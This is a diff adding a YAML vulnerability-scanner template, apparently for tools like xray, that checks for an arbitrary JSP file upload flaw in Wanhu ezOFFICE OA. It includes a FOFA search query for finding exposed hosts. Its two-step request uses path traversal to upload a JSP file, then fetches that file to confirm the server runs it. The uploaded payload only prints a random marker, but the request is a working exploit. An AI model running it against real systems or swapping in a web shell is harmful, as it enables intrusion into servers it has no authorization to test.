@@ -1,0 +1,49 @@
+id: poc-yaml-wanhu-ezoffice-upload-jsp-anyfile-upload
+info:
+  name: 万户ezoffice upload.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+requests:
+- method: POST
+  path: /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=1&path=../platform/portal/com/
+  headers:
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundarykIU0ZM0wGHiH6FRd
+  data: '------WebKitFormBoundarykIU0ZM0wGHiH6FRd
+
+    Content-Disposition:form-data;name="file";filename="{{.filename}}.jsp"
+
+    content-type:image/pne
+
+
+    <%
+
+    out.println("{{.content}}");
+
+    %>
+
+    ------WebKitFormBoundarykIU0ZM0wGHiH6FRd--
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"parent.afterUpload")
+
+    '
+  output:
+  - regex_match(body,"parent.afterUpload\\('(?P<path>[0-9]+).jsp")
+  - regex_match(body,"parent.afterUpload\\('(?P<time>[0-9]{6})")
+- method: GET
+  path: /defaultroot/platform/portal/com/{{.time}}/{{.path}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
